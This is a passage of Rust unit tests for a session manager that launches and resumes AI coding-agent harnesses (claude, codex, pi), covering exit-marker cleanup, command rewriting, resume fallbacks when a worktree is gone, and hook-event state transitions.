        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();
        std::fs::write(&clean_path, "").unwrap();

        mgr.stop_session(&id, true).await.unwrap();

        assert!(!code_path.exists());
        assert!(!clean_path.exists());
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_removes_exit_markers() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let s = mgr
            .create_session(make_req("cleanup-markers"))
            .await
            .unwrap();
        let data_dir = mgr.store().data_dir().to_owned();
        let id = s.id.to_string();
        let code_path = exit_code_marker_path(&data_dir, &id);
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();
        sqlx::query("UPDATE sessions SET status = 'done' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.sessions_deleted, 1);
        assert!(resp.logs_cleaned >= 1, "got: {resp:?}");
        assert!(!code_path.exists());
    }

    #[tokio::test]
    async fn test_cleanup_sweeps_orphan_exit_markers() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let data_dir = mgr.store().data_dir().to_owned();
        let exit_dir_path = exit_dir(&data_dir);
        std::fs::create_dir_all(&exit_dir_path).unwrap();
        let orphan_id = uuid::Uuid::new_v4();
        let orphan_code = exit_dir_path.join(format!("{orphan_id}.code"));
        std::fs::write(&orphan_code, "0").unwrap();

        let resp = mgr.cleanup_dead_sessions().await.unwrap();
        assert_eq!(resp.logs_cleaned, 1);
        assert!(!orphan_code.exists());
    }

    // -- Harness adapter integration --------------------------------------------

    fn harness_req(name: &str, command: &str) -> CreateSessionRequest {
        CreateSessionRequest {
            command: Some(command.into()),
            ..make_req(name)
        }
    }

    #[tokio::test]
    async fn test_create_session_claude_command_sets_harness_and_rewrites_spawn() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(harness_req("claude-sess", "claude -p 'fix'"))
            .await
            .unwrap();

        // The session row keeps the ORIGINAL command (resume needs it verbatim).
        assert_eq!(session.command, "claude -p 'fix'");
        assert_eq!(session.harness.as_deref(), Some("claude"));
        assert!(session.harness_session_id.is_some());

        // The backend actually received the rewritten command.
        let calls = backend.calls.lock().unwrap();
        let sid = session.harness_session_id.clone().unwrap();
        assert!(calls[0].contains(&format!("--session-id {sid}")));
        assert!(calls[0].contains("--settings"));
        drop(calls);

        // The settings file was actually written under the harness dir.
        let harness_dir =
            crate::session::utils::harness_dir(mgr.store().data_dir(), &session.id.to_string());
        assert!(harness_dir.join("claude-settings.json").exists());
    }

    #[tokio::test]
    async fn test_create_session_non_harness_command_sets_generic() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(harness_req("generic-sess", "bash -lc 'echo hi'"))
            .await
            .unwrap();

        assert_eq!(session.harness.as_deref(), Some("generic"));
        assert!(session.harness_session_id.is_none());
        let calls = backend.calls.lock().unwrap();
        // Unchanged — no --session-id/--settings injected for a non-adapter command.
        assert!(!calls[0].contains("--session-id"));
        drop(calls);
    }

    #[tokio::test]
    async fn test_create_session_claude_with_resume_flag_skips_session_id() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(harness_req("claude-resume", "claude --resume abc-123"))
            .await
            .unwrap();

        assert_eq!(session.harness.as_deref(), Some("claude"));
        // The user already pinned the resume target — no NEW id minted at spawn time.
        assert!(session.harness_session_id.is_none());
        let calls = backend.calls.lock().unwrap();
        assert!(calls[0].contains("--resume abc-123"));
        assert!(calls[0].contains("--settings"));
        assert!(!calls[0].contains("--session-id"));
        drop(calls);
    }

    #[tokio::test]
    async fn test_resume_session_uses_adapter_resume_command() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(harness_req("claude-to-resume", "claude -p 'fix'"))
            .await
            .unwrap();
        let harness_session_id = session.harness_session_id.clone().unwrap();
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Lost, None)
            .await
            .unwrap();
        backend.calls.lock().unwrap().clear();

        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);

        let calls = backend.calls.lock().unwrap();
        let create_call = calls
            .iter()
            .find(|c| c.starts_with("create:"))
            .expect("expected a create call on resume");
        assert!(create_call.contains(&format!("--resume {harness_session_id}")));
        assert!(create_call.contains("--settings"));
        assert!(!create_call.contains("--session-id"));
        drop(calls);
    }

    #[tokio::test]
    async fn test_resume_session_without_harness_session_id_falls_back_to_original() {
        // Pre-harness-adapter session: no harness fields set at all.
        let (mgr, backend, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr.create_session(make_req("legacy-sess")).await.unwrap();
        sqlx::query("UPDATE sessions SET harness = NULL, harness_session_id = NULL, status = 'lost' WHERE id = ?")
            .bind(session.id.to_string())
            .execute(&pool)
            .await
            .unwrap();
        backend.calls.lock().unwrap().clear();

        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);
        let calls = backend.calls.lock().unwrap();
        let create_call = calls.iter().find(|c| c.starts_with("create:")).unwrap();
        assert!(create_call.contains("echo hello"));
        assert!(!create_call.contains("--resume"));
        drop(calls);
    }

    #[tokio::test]
    async fn test_resume_session_claude_without_harness_session_id_uses_continue_fallback() {
        // The user's own --session-id made prepare_spawn a full no-op at spawn time
        // (see claude.rs's IDENTITY_FLAGS), so pulpo never minted/learned one — resume
        // must fall back to `--continue` (most recent conversation) rather than
        // re-running the bare original command as a brand new one.
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(harness_req(
                "claude-user-picked-id",
                "claude --session-id user-chosen",
            ))
            .await
            .unwrap();
        assert_eq!(session.harness.as_deref(), Some("claude"));
        assert!(session.harness_session_id.is_none());
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Lost, None)
            .await
            .unwrap();
        backend.calls.lock().unwrap().clear();

        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);

        let calls = backend.calls.lock().unwrap();
        let create_call = calls.iter().find(|c| c.starts_with("create:")).unwrap();
        assert!(create_call.contains("--continue"));
        assert!(create_call.contains("--settings"));
        assert!(!create_call.contains("--resume"));
        assert!(!create_call.contains("--session-id"));
    }

    #[tokio::test]
    async fn test_resume_session_codex_without_harness_session_id_uses_resume_last_fallback() {
        // Codex never presets its own session id at spawn — harness_session_id is
        // only known once a SessionStart hook fires, which never happens under
        // MockBackend. Resume must still target this exact session's own thread via
        // `resume --last` rather than starting a brand new one.
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(harness_req("codex-to-resume", "codex -p 'fix'"))
            .await
            .unwrap();
        assert_eq!(session.harness.as_deref(), Some("codex"));
        assert!(session.harness_session_id.is_none());
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Lost, None)
            .await
            .unwrap();
        backend.calls.lock().unwrap().clear();

        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);

        let calls = backend.calls.lock().unwrap();
        let create_call = calls.iter().find(|c| c.starts_with("create:")).unwrap();
        assert!(create_call.contains("resume"));
        assert!(create_call.contains("--last"));
        assert!(create_call.contains("--dangerously-bypass-hook-trust"));
    }

    #[tokio::test]
    async fn test_resume_session_pi_without_harness_session_id_uses_continue_fallback() {
        // A pi session predating harness adapters (or a manually-cleared row): no
        // harness_session_id at all. Resume must fall back to `-c`/`--continue`
        // rather than minting a brand new session id.
        let (mgr, backend, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(harness_req("pi-legacy-row", "pi -p 'fix'"))
            .await
            .unwrap();
        assert_eq!(session.harness.as_deref(), Some("pi"));
        assert!(session.harness_session_id.is_some());
        sqlx::query("UPDATE sessions SET harness_session_id = NULL, status = 'lost' WHERE id = ?")
            .bind(session.id.to_string())
            .execute(&pool)
            .await
            .unwrap();
        backend.calls.lock().unwrap().clear();

        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);

        let calls = backend.calls.lock().unwrap();
        let create_call = calls.iter().find(|c| c.starts_with("create:")).unwrap();
        assert!(create_call.contains("--continue"));
        assert!(create_call.contains("-e "));
        assert!(!create_call.contains("--session-id"));
    }

    // -- fallback resume refused when its worktree is gone (#128 follow-up) ------

    #[test]
    fn test_original_resume_workdir_prefers_worktree_path_even_if_gone() {
        // Unlike `effective_resume_workdir`, this does not check whether the path
        // still exists on disk — it reports where the harness conversation
        // actually ran, so callers can detect the "silently substituted" case.
        let session = Session {
            workdir: "/repo".into(),
            worktree_path: Some("/repo/.worktrees/gone".into()),
            ..Default::default()
        };
        assert_eq!(
            SessionManager::original_resume_workdir(&session),
            "/repo/.worktrees/gone"
        );
    }

    #[test]
    fn test_original_resume_workdir_falls_back_to_workdir_without_worktree() {
        let session = Session {
            workdir: "/repo".into(),
            worktree_path: None,
            ..Default::default()
        };
        assert_eq!(SessionManager::original_resume_workdir(&session), "/repo");
    }

    /// Build a session (harness set, no known `harness_session_id`) whose
    /// `worktree_path` points at a directory that has already been removed —
    /// `effective_resume_workdir` will fall back to `real_workdir` (which does
    /// exist, so `resume_session`'s workdir validation passes), exactly the
    /// "worktree gone" case `resolve_resume_command`'s refusal guards against.
    fn worktree_gone_session(
        name: &str,
        harness: &str,
        command: &str,
        real_workdir: &std::path::Path,
        removed_worktree_path: String,
    ) -> Session {
        Session {
            id: Uuid::new_v4(),
            name: name.into(),
            workdir: real_workdir.to_string_lossy().into_owned(),
            worktree_path: Some(removed_worktree_path),
            command: command.into(),
            harness: Some(harness.into()),
            harness_session_id: None,
            status: SessionStatus::Lost,
            backend_session_id: Some(name.into()),
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        }
    }

    #[tokio::test]
    async fn test_resume_session_claude_fallback_refuses_when_worktree_gone() {
        // Claude's `--continue` fallback means "the most recent conversation in
        // the current working directory" — if the session's worktree was removed
        // and `effective_resume_workdir` silently falls back to the plain
        // `workdir`, running `--continue` there could resume a completely
        // unrelated conversation. Must refuse instead of guessing.
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let real_workdir = tempfile::tempdir().unwrap();
        let removed_worktree = tempfile::tempdir().unwrap();
        let removed_worktree_path = removed_worktree.path().to_str().unwrap().to_owned();
        drop(removed_worktree); // the worktree no longer exists on disk

        let session = worktree_gone_session(
            "claude-worktree-gone",
            "claude",
            "claude -p 'fix'",
            real_workdir.path(),
            removed_worktree_path,
        );
        mgr.store().insert_session(&session).await.unwrap();
        backend.calls.lock().unwrap().clear();

        let error = mgr
            .resume_session(&session.id.to_string())
            .await
            .unwrap_err();
        let message = error.to_string();
        assert!(message.contains("worktree"), "{message}");
        assert!(message.contains("claude"), "{message}");
        assert!(message.contains("start a new session"), "{message}");

        let calls = backend.calls.lock().unwrap();
        assert!(
            !calls.iter().any(|c| c.starts_with("create:")),
            "must not spawn a fallback resume from the wrong directory: {calls:?}"
        );
    }

    #[tokio::test]
    async fn test_resume_session_refusal_leaves_exit_markers_and_harness_state_untouched() {
        // `resolve_resume_command` must run BEFORE `remove_exit_markers`/
        // `clear_harness_heuristic_state` in `restore_session_backend` — a
        // refusal (cwd-scoped resume, worktree gone) must leave the session
        // exactly as it was. Before this fix, those destructive side effects
        // ran unconditionally first, so a refused resume attempt still wiped
        // state a *later*, successful resume attempt would have needed.
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let real_workdir = tempfile::tempdir().unwrap();
        let removed_worktree = tempfile::tempdir().unwrap();
        let removed_worktree_path = removed_worktree.path().to_str().unwrap().to_owned();
        drop(removed_worktree);

        let session = worktree_gone_session(
            "claude-refusal-preserves-state",
            "claude",
            "claude -p 'fix'",
            real_workdir.path(),
            removed_worktree_path,
        );
        mgr.store().insert_session(&session).await.unwrap();
        backend.calls.lock().unwrap().clear();

        let data_dir = mgr.store().data_dir().to_owned();
        let id = session.id.to_string();
        let code_path = exit_code_marker_path(&data_dir, &id);
        std::fs::create_dir_all(code_path.parent().unwrap()).unwrap();
        std::fs::write(&code_path, "0").unwrap();
        mgr.store()
            .batch_update_session_metadata(&id, &[(meta::NEEDS_INPUT, "permission")], &[])
            .await
            .unwrap();
        mgr.store().touch_harness_last_event_at(&id).await.unwrap();

        mgr.resume_session(&id).await.unwrap_err();

        assert!(
            has_exit_marker(&data_dir, &id),
            "a refused resume must not remove the exit marker"
        );
        let fetched = mgr.get_session(&id).await.unwrap().unwrap();
        assert!(
            fetched.harness_last_event_at.is_some(),
            "a refused resume must not clear harness_last_event_at"
        );
        assert_eq!(
            fetched.meta_str(meta::NEEDS_INPUT),
            Some("permission"),
            "a refused resume must not clear needs_input metadata"
        );
    }

    #[tokio::test]
    async fn test_resume_session_pi_fallback_refuses_when_worktree_gone() {
        // pi's `-c`/`--continue` fallback is documented (pi.rs's module doc) as
        // scoped to `(cwd, sessionDir)` — "most recent session in this cwd" —
        // the same cwd-dependent shape as Claude's `--continue`, so it must be
        // refused the same way when the worktree is gone.
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let real_workdir = tempfile::tempdir().unwrap();
        let removed_worktree = tempfile::tempdir().unwrap();
        let removed_worktree_path = removed_worktree.path().to_str().unwrap().to_owned();
        drop(removed_worktree);

        let session = worktree_gone_session(
            "pi-worktree-gone",
            "pi",
            "pi -p 'fix'",
            real_workdir.path(),
            removed_worktree_path,
        );
        mgr.store().insert_session(&session).await.unwrap();
        backend.calls.lock().unwrap().clear();

        let error = mgr
            .resume_session(&session.id.to_string())
            .await
            .unwrap_err();
        assert!(error.to_string().contains("start a new session"));

        let calls = backend.calls.lock().unwrap();
        assert!(!calls.iter().any(|c| c.starts_with("create:")));
    }

    #[tokio::test]
    async fn test_resume_session_codex_fallback_still_works_when_worktree_gone() {
        // Codex's `resume --last` fallback is keyed by this session's own
        // isolated CODEX_HOME (under data_dir/harness/<session_id>/), never by
        // cwd — so unlike Claude/pi it must NOT be refused just because the
        // original worktree is gone. See also S16's e2e extension of this case.
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let real_workdir = tempfile::tempdir().unwrap();
        let removed_worktree = tempfile::tempdir().unwrap();
        let removed_worktree_path = removed_worktree.path().to_str().unwrap().to_owned();
        drop(removed_worktree);

        let session = worktree_gone_session(
            "codex-worktree-gone",
            "codex",
            "codex -p 'fix'",
            real_workdir.path(),
            removed_worktree_path,
        );
        mgr.store().insert_session(&session).await.unwrap();
        backend.calls.lock().unwrap().clear();

        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);

        let calls = backend.calls.lock().unwrap();
        let create_call = calls.iter().find(|c| c.starts_with("create:")).unwrap();
        assert!(create_call.contains("resume"));
        assert!(create_call.contains("--last"));
    }

    #[tokio::test]
    async fn test_resume_session_pi_exact_resume_refuses_when_worktree_gone() {
        // pi's exact `--session-id <id>` resume is itself scoped to
        // `(cwd, sessionDir)` (see `HarnessAdapter::resume_is_cwd_scoped` and
        // `pi.rs`'s module doc) — unlike Claude's `--resume <id>`/Codex's
        // `resume <id>`, which are keyed globally. Even though a
        // `harness_session_id` IS known here (unlike the fallback tests above),
        // running the exact resume from a substituted workdir could silently
        // open or create a different, unrelated session at that id — must be
        // refused exactly like the fallback path already is.
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let real_workdir = tempfile::tempdir().unwrap();
        let removed_worktree = tempfile::tempdir().unwrap();
        let removed_worktree_path = removed_worktree.path().to_str().unwrap().to_owned();
        drop(removed_worktree); // the worktree no longer exists on disk

        let session = Session {
            id: Uuid::new_v4(),
            name: "pi-exact-resume-worktree-gone".into(),
            workdir: real_workdir.path().to_string_lossy().into_owned(),
            worktree_path: Some(removed_worktree_path.clone()),
            command: "pi -p 'fix'".into(),
            harness: Some("pi".into()),
            harness_session_id: Some("pi-sid-1".into()),
            status: SessionStatus::Lost,
            backend_session_id: Some("pi-exact-resume-worktree-gone".into()),
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();
        backend.calls.lock().unwrap().clear();

        let error = mgr
            .resume_session(&session.id.to_string())
            .await
            .unwrap_err();
        let message = error.to_string();
        assert!(message.contains(&removed_worktree_path), "{message}");
        assert!(message.contains("pi"), "{message}");
        assert!(message.contains("start a new session"), "{message}");

        let calls = backend.calls.lock().unwrap();
        assert!(
            !calls.iter().any(|c| c.starts_with("create:")),
            "must not spawn an exact resume from the wrong directory: {calls:?}"
        );
    }

    #[tokio::test]
    async fn test_resume_session_claude_exact_resume_still_works_when_worktree_gone() {
        // Sanity check for the guard above: Claude's exact `--resume <id>` is NOT
        // cwd-scoped (`resume_is_cwd_scoped` defaults to `false`), so it must
        // still succeed even though the worktree is gone — only pi opts in.
        let (mgr, backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let real_workdir = tempfile::tempdir().unwrap();
        let removed_worktree = tempfile::tempdir().unwrap();
        let removed_worktree_path = removed_worktree.path().to_str().unwrap().to_owned();
        drop(removed_worktree);

        let session = Session {
            id: Uuid::new_v4(),
            name: "claude-exact-resume-worktree-gone".into(),
            workdir: real_workdir.path().to_string_lossy().into_owned(),
            worktree_path: Some(removed_worktree_path),
            command: "claude -p 'fix'".into(),
            harness: Some("claude".into()),
            harness_session_id: Some("claude-sid-1".into()),
            status: SessionStatus::Lost,
            backend_session_id: Some("claude-exact-resume-worktree-gone".into()),
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();
        backend.calls.lock().unwrap().clear();

        let resumed = mgr.resume_session(&session.id.to_string()).await.unwrap();
        assert_eq!(resumed.status, SessionStatus::Working);

        let calls = backend.calls.lock().unwrap();
        let create_call = calls.iter().find(|c| c.starts_with("create:")).unwrap();
        assert!(create_call.contains("--resume"));
        assert!(create_call.contains("claude-sid-1"));
    }

    #[tokio::test]
    async fn test_purge_session_removes_harness_dir() {
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(harness_req("purge-harness", "claude -p 'fix'"))
            .await
            .unwrap();
        let harness_dir =
            crate::session::utils::harness_dir(mgr.store().data_dir(), &session.id.to_string());
        assert!(harness_dir.exists());

        mgr.stop_session(&session.id.to_string(), true)
            .await
            .unwrap();

        assert!(!harness_dir.exists());
    }

    // -- remove_session: staleness resolution + stuck `starting` rows (#129 follow-up) --

    #[tokio::test]
    async fn test_remove_session_resolves_dead_but_unlisted_working_session() {
        // A session whose backend already died but nothing has polled it yet
        // (no prior get/list) used to be refused with a 409-mapped error —
        // `remove_session` now resolves staleness itself first, via the same
        // `check_and_mark_stale` sweep `get_session`/`list_sessions` apply.
        let (mgr, _backend, _pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("remove-dead-unlisted"))
            .await
            .unwrap();
        let id = session.id.to_string();

        mgr.remove_session(&id).await.unwrap();

        assert!(mgr.get_session(&id).await.unwrap().is_none());
    }

    #[tokio::test]
    async fn test_remove_session_allows_starting_row_when_backend_dead() {
        // A row stuck in `starting` (the daemon crashed between insert and
        // `finalize_created_session`) is unreachable by every other path —
        // `check_and_mark_stale` never considers `starting` — so it must be
        // removable once its backend is confirmed dead, or it blocks its name
        // via `idx_sessions_live_name` forever.
        let (mgr, _backend, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("stuck-starting"))
            .await
            .unwrap();
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'starting' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();

        mgr.remove_session(&id).await.unwrap();

        assert!(mgr.get_session(&id).await.unwrap().is_none());
    }

    #[tokio::test]
    async fn test_remove_session_refuses_starting_row_when_backend_alive() {
        // A `starting` session whose backend IS alive is legitimately
        // mid-creation — must stay refused, unlike the dead-backend case above.
        let (mgr, _backend, pool) = test_manager(MockBackend::new().with_alive(true)).await;
        let session = mgr
            .create_session(make_req("legit-starting"))
            .await
            .unwrap();
        let id = session.id.to_string();
        sqlx::query("UPDATE sessions SET status = 'starting' WHERE id = ?")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();

        let error = mgr.remove_session(&id).await.unwrap_err();
        assert!(error.to_string().contains("starting"), "{error}");

        assert!(mgr.get_session(&id).await.unwrap().is_some());
    }

    #[tokio::test]
    async fn test_cleanup_dead_sessions_removes_harness_dir() {
        let (mgr, _backend, pool) = test_manager(MockBackend::new()).await;
        let session = mgr
            .create_session(harness_req("cleanup-harness", "claude -p 'fix'"))
            .await
            .unwrap();
        let harness_dir =
            crate::session::utils::harness_dir(mgr.store().data_dir(), &session.id.to_string());
        assert!(harness_dir.exists());
        sqlx::query("UPDATE sessions SET status = 'done' WHERE id = ?")
            .bind(session.id.to_string())
            .execute(&pool)
            .await
            .unwrap();

        mgr.cleanup_dead_sessions().await.unwrap();

        assert!(!harness_dir.exists());
    }

    // -- apply_harness_event ------------------------------------------------------

    async fn harness_session(mgr: &SessionManager) -> Session {
        mgr.create_session(harness_req("hook-sess", "claude -p 'fix'"))
            .await
            .unwrap()
    }

    #[tokio::test]
    async fn test_apply_harness_event_session_not_found() {
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let err = mgr
            .apply_harness_event("nonexistent", "claude", &serde_json::json!({}))
            .await
            .unwrap_err();
        assert!(err.to_string().contains("not found"));
    }

    #[tokio::test]
    async fn test_apply_harness_event_unknown_harness() {
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let session = harness_session(&mgr).await;
        let err = mgr
            .apply_harness_event(&session.id.to_string(), "gemini", &serde_json::json!({}))
            .await
            .unwrap_err();
        assert!(err.to_string().contains("unknown harness"));
    }

    #[tokio::test]
    async fn test_apply_harness_event_harness_mismatch_is_rejected() {
        // The session was spawned as "claude" — a request claiming a different
        // (still-registered) harness id must be rejected rather than trusted, and
        // must not touch the session at all.
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let session = harness_session(&mgr).await;
        assert_eq!(session.harness.as_deref(), Some("claude"));

        let err = mgr
            .apply_harness_event(
                &session.id.to_string(),
                "codex",
                &serde_json::json!({"hook_event_name": "UserPromptSubmit"}),
            )
            .await
            .unwrap_err();
        assert!(err.to_string().contains("harness mismatch"), "{err}");

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.harness.as_deref(), Some("claude"));
        assert!(fetched.harness_last_event_at.is_none());
    }

    #[tokio::test]
    async fn test_apply_harness_event_ignores_stopped_session() {
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let session = harness_session(&mgr).await;
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Done, None)
            .await
            .unwrap();

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({"hook_event_name": "UserPromptSubmit"}),
        )
        .await
        .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Done);
        assert!(
            fetched.harness_last_event_at.is_none(),
            "a stale hook on a stopped session must touch nothing"
        );
    }

    #[tokio::test]
    async fn test_apply_harness_event_ignores_lost_session() {
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let session = harness_session(&mgr).await;
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Lost, None)
            .await
            .unwrap();

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({"hook_event_name": "Stop"}),
        )
        .await
        .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
        assert!(fetched.harness_last_event_at.is_none());
    }

    #[tokio::test]
    async fn test_apply_harness_event_always_touches_last_event_at() {
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let session = harness_session(&mgr).await;
        assert!(session.harness_last_event_at.is_none());

        // An event the adapter doesn't recognize still marks events as flowing.
        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({"hook_event_name": "PreToolUse"}),
        )
        .await
        .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert!(fetched.harness_last_event_at.is_some());
        assert_eq!(fetched.status, SessionStatus::Working);
    }

    #[tokio::test]
    async fn test_apply_harness_event_session_started_sets_id_and_active() {
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let session = harness_session(&mgr).await;

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({
                "hook_event_name": "SessionStart",
                "session_id": "sid-from-hook",
                "source": "startup",
            }),
        )
        .await
        .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Working);
        assert_eq!(fetched.harness_session_id.as_deref(), Some("sid-from-hook"));
    }

    #[tokio::test]
    async fn test_apply_harness_event_turn_finished_sets_idle_and_summary() {
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let session = harness_session(&mgr).await;

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({
                "hook_event_name": "Stop",
                "last_assistant_message": "Fixed it",
            }),
        )
        .await
        .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Waiting);
        assert!(fetched.idle_since.is_some());
        assert_eq!(fetched.meta_str(meta::LAST_SUMMARY), Some("Fixed it"));
    }

    #[tokio::test]
    async fn test_apply_harness_event_needs_input_sets_metadata() {
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let session = harness_session(&mgr).await;

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({
                "hook_event_name": "Notification",
                "matcher": "permission_prompt",
            }),
        )
        .await
        .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Waiting);
        assert_eq!(
            fetched.status_reason.as_deref(),
            Some("needs_input:permission")
        );
        // New code no longer writes the pre-ADR-0009 `needs_input` metadata key.
        assert_eq!(fetched.meta_str(meta::NEEDS_INPUT), None);
    }

    #[tokio::test]
    async fn test_apply_harness_event_working_clears_needs_input() {
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let session = harness_session(&mgr).await;
        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({"hook_event_name": "Notification", "matcher": "permission_prompt"}),
        )
        .await
        .unwrap();

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({"hook_event_name": "UserPromptSubmit"}),
        )
        .await
        .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Working);
        assert_eq!(fetched.meta_str(meta::NEEDS_INPUT), None);
    }

    #[tokio::test]
    async fn test_apply_harness_event_failed_sets_error_and_rate_limit() {
        let (mgr, _backend, _pool) = test_manager(MockBackend::new()).await;
        let session = harness_session(&mgr).await;

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({
                "hook_event_name": "StopFailure",
                "error_type": "rate_limit_error",
            }),
        )
        .await
        .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Waiting);
        assert_eq!(
            fetched.meta_str(meta::ERROR_STATUS),
            Some("rate_limit_error")
        );
        assert_eq!(fetched.meta_str(meta::RATE_LIMIT), Some("rate_limit_error"));
    }

    #[tokio::test]
    async fn test_apply_harness_event_session_ended_leaves_status_alone_without_marker() {
        // ADR 0009: `SessionEnded` on its own never sets a status (the harness
        // process is only just starting to exit) — backend aliveness plays no role
        // in `apply_harness_event` at all anymore, only the exit marker does. With
        // no marker present, the session simply stays `Working`; the ordinary
        // dead-backend classification (driven by the next `get_session` call, once
        // the backend is actually confirmed dead) is what eventually resolves it.
        let (mgr, _backend, _pool) = test_manager(MockBackend::new().with_alive(true)).await;
        let session = harness_session(&mgr).await;

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({"hook_event_name": "SessionEnd"}),
        )
        .await
        .unwrap();

        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Working);
        assert_eq!(fetched.status_reason, None);
    }

    #[tokio::test]
    async fn test_apply_harness_event_session_ended_leaves_status_alone_when_backend_dead() {
        // Same as above — backend aliveness alone (no marker) still isn't enough to
        // transition; that's `check_and_mark_stale`'s job on the next check.
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = harness_session(&mgr).await;
        *backend.alive.lock().unwrap() = false;

        mgr.apply_harness_event(
            &session.id.to_string(),
            "claude",
            &serde_json::json!({"hook_event_name": "SessionEnd"}),
        )
        .await
        .unwrap();

        // `SessionManager::get_session` itself would now run the lazy dead-backend
        // check (no marker → `Lost`) since the mock backend reports dead — read the
